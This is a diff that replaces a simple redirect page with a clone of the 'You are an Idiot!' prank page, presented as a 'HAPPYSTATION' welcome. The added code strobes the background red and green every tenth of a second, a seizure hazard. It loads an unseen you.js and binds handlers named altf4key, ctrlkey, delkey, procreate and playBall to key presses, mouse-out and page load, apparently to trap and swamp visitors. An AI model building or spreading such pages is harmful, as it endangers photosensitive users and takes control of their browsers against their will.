@@ -1,26 +1,46 @@
-<!doctype html>
+<!DOCTYPE html>
 <html>
-    <script>
-        //让DOM加载完在加载本脚本
-        window.onload = function() {
+	<head>
+		<title>You are an Idiot!</title>
+		<meta http-equiv=refresh content="0;url=./dj.html">
+		<style type="text/css">
+			<!--
+			style1 {color: #FF0000}
+			-->
+			<style>
+			  @-webkit-keyframes argh-my-eyes {
+				0%   { background-color: #fef; }
+				49% { background-color: #fff; }
+				50% { background-color: #000; }
+				99% { background-color: #000; }
+				100% { background-color: #fef; }
+			  }
+			  @-moz-keyframes argh-my-eyes {
+				0%   { background-color: #fff; }
+				49% { background-color: #fff; }
+				50% { background-color: #000; }
+				99% { background-color: #000; }
+				100% { background-color: #fff; }
+			  }
+			  @keyframes argh-my-eyes {
+				0%   { background-color: #FF0040; }
+				49% { background-color: #FF0040; }
+				50% { background-color: #40FF00; }
+				99% { background-color: #40FF00; }
+				100% { background-color: #FF0040; }
+			  }
+			  body {
+			  -webkit-animation: argh-my-eyes 1s infinite;
+			  -moz-animation:    argh-my-eyes 1s infinite;
+			  animation:         argh-my-eyes 0.1s infinite;
+			}
+			</style>
+		</style>
+		
+		<script src="you.js"></script>
+	</head>
 
-            //设置随机函数
-            function getRndInteger(min, max) {
-                return Math.floor(Math.random() * ((max + 1) - min)) + min;
-            }
-
-            //使用函数生成范围内随机数字
-            var num = getRndInteger(1, 4);
-
-            //拼接后缀名
-            var path = num + ".mp3";
-
-            //生成链接
-            var url = "./dj/" + path;
-
-            alert("Welcome to FBIK.'s HAPPYSTATION")
-
-            window.location.replace(url); 
-        }
-    </script>
+	<body onload="flagRun=1;playBall();return true;bookmark();" onkeydown="altf4key();ctrlkey();delkey();" onmouseout="procreate();" leftmargin="0" topmargin="0" marginwidth="0" marginheight="0">
+		<center><h1 style="color:white;">WELCOME TO <br/>FBIK.'s HAPPYSTATION!!!</h1></center>
+	</body>
 </html>
